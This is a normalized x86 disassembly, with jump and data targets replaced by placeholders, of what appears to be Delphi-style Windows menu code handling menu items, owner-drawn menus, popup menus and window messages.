mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45d758
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45d758
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_45d490
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_45da2c
mov eax ebx
call sub_408730
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45d530
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_45d490
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4041c0
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404410
lea edx [ ebp - 0x200 ]
call sub_4087f4
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45d5c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_45d634
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45dad4
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45dad4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_45dad4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45d640
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45d530
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_45d5c4
mov eax ebx
call sub_45daf8
jmp r-xdata
sub_45d6a8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45d6f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_457920
mov eax ebx
call sub_45cf04
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_457964
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_42109c
sub_45d72c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4212e8
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45d6f0
sub_45d770
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45cfb4
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_45cfb4
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_460a78
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_45d7cc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_45d8a1
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45cfb4
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45cfb4
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45bb60
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45bb70
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404138
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404138
mov eax [ ebp - 0xc ]
pop edx
call sub_407edc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_45e618
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d8a8
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f74
retn
sub_45d8b4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45d770
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45d7cc
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_45da2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_45d138
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_45cfb4
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_45cfb4
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4087d4
mov eax [ ebp + 0x10 ]
call sub_408718
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45daf8
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_446d00
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45dad4
mov [ ebx + 0x41 ] 0x1
sub_45db20
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45dad4
mov [ ebx + 0x41 ] 0x1
sub_45dbac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45d6a8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45d530
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_45dc3c
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45dc78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45dca2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45dcc4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e1f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e1fe
lea eax [ ebp - 0x30 ]
call sub_403f50
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov edx [ esi + 0x4 ]
call sub_45d070
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46a088
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov dx [ esi + 0x4 ]
call sub_45d054
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45e02a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45e00d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_425038
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424ed8
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45e49c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e014
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_425038
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_45d8b4
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_45cfb4
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45cfb4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45e16d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45e148
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45e12b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_425038
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424ed8
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e132
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_425038
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_446f84
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a088
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45cfb4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_45cfb4
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_45cfb4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_45cfe4
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_45cfe4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_469d2c
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_469d94
jmp r-xdata
sub_45e14f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_45e208
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_418454
pop esi
pop ebx
retn
push ebx
push sub_45dc78
call sub_422118
mov [ ebx + 0x10 ] eax
sub_45e24c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45cdcc
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_45e208
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45e2c0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45e230
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45ce68
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_45e318
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_459164
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_45dad4
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45dad4
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_45e360
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_459164
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4688d8
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403350
mov edx eax
jmp r-xdata
sub_45e3ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_416efc
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_45e318
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45c720
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45cc1c
mov eax [ ebx + 0x34 ]
call sub_459fc4
mov eax ebx
call sub_45d5c4
mov eax ebx
call sub_45e360
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_45a0f4
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45e460
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4185b0
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4185b0
cmp ebp [ eax ]
jne r-xdata
sub_45e49c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4247f4
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_424028
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_4247f4
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_424028
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403350
mov edx [ r-xdata ]
call sub_4032e0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4247f4
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_424028
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_45e584
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403fa4
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404210
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
